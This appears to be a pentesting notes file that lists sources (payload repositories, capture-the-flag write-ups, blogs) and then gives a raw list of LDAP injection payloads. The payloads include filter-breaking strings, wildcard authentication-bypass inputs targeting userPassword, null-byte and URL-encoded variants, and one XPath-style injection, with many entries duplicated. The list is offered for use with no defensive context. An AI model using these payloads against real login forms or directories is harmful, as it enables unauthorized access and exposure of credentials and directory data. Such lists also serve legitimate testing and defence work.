## Citations
- InfoSecWarrior:  https://github.com/InfoSecWarrior/Offensive-Pentesting-Web/tree/main/Injections/LDAP-Injection
- PayLoadAllTheThings: https://github.com/Ne3o1/PayLoadAllTheThings/tree/master/LDAP%20injection
- LDAP_payload:https://www.freebuf.com/vuls/356049.html
               https://exp-blog.com/safe/ctf/rootme/web-server/ldap-injection-authentication/
               https://blog.csdn.net/qq_45290991/article/details/113713261
               https://blog.csdn.net/luoshu88/article/details/132149278
               https://rce.moe/2022/01/25/ldap-inject-1/



## LDAP payload list：
```
*
*)(&
*))%00
 )(cn=))\x00
 *()|%26'
 *()|&'
 *(|(mail=*))
 *(|(objectclass=*))
 *)(uid=*))(|(uid=*
 */*
 *|
 /
 //
 //*
 @*
 |
 admin*
 admin*)((|userpassword=*)
 admin*)((|userPassword=*)
 x' or name()='username' or 'x'='y
*()|%26'
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
*/*
*|
/
//
//*
@*
|
admin*
admin*)((|userpassword=*)
admin*)((|userPassword=*)
x' or name()='username' or 'x'='y
!
%21
%26
%28
%29
%2A%28%7C%28mail%3D%2A%29%29
%2A%28%7C%28objectclass%3D%2A%29%29
%2A%7C
%7C
&
(
)
```
